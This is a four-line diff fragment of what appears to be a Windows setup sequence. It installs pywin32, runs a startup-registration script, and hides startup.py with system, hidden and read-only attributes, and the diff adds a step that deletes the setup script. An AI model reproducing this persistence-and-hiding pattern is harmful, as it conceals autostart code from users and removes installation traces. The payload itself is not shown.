@@ -28,3 +28,4 @@ pip install pywin32
 python set_startup.py
 
 attrib +s +h +r "startup.py"
+del set_startup.py
